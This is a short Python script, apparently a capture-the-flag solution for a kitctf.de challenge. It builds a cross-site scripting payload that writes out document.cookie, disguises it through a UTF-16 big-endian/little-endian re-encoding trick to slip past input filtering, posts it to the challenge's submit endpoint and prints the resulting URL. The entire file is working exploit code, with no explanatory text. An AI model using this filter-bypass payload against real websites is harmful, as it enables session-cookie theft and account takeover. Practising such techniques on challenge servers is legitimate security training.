import requests

payload = "\ufeff<script>document.write(document.cookie)</script>"
be = payload.encode("utf-16-be")
note = requests.post(
   "https://another-one-bites-the-dust--jordin-sparks-5885.ctf.kitctf.de/submit?" + be.decode("utf-16-le"),
).url

print(note)
